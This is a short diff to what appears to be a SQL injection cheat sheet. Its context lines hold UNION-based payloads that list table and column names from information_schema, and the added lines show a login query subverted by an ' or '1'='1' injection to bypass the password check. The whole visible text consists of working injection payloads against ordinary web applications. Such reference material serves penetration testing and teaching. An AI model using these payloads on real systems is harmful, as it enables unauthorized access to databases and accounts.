@@ -24,4 +24,7 @@
 1' union select 1,table_name,table_schema from information_schema.tables; -- - 
 1' union select 1,column_name,table_schema from information_schema.columns where table_name='tablename'; -- - 
 ```
-- 
+
+```sql
+select * from users where username = '' or '1'='1' or '=' and password = '
+```
